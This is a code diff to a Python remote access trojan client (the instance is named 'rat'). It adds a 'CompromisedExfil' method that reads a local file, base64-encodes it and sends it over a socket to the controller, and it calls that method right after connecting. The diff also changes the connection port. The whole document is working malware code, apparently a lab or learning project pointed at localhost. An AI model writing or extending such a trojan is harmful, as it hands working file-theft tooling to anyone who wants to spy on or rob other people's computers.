@@ -20,6 +20,17 @@ class CLIENT:
         information_send = socket.gethostbyname(socket.gethostname())
         sock.send(information_send.encode())
 
+    def CompromisedExfil(self):
+        file = open('kali.txt', "rb")
+        bytes = file.read(1024)
+        base64_bytes = base64.b64encode(bytes)
+        file_json = {
+            "name" : 'kali-dest.txt',
+            "data" : base64_bytes.decode()
+        }
+        file_send = json.dumps(file_json)
+        #client.send(command.encode())
+        sock.send(file_send.encode())
 
     def main_loop(self):
         while True:
@@ -73,9 +84,10 @@ class CLIENT:
                 file.close()
 
                 
-rat = CLIENT('127.0.0.1', 4444)
+rat = CLIENT('127.0.0.1', 4445)
 
 if __name__ == '__main__':
     rat.connection()
+    rat.CompromisedExfil()
     rat.main_loop()
  
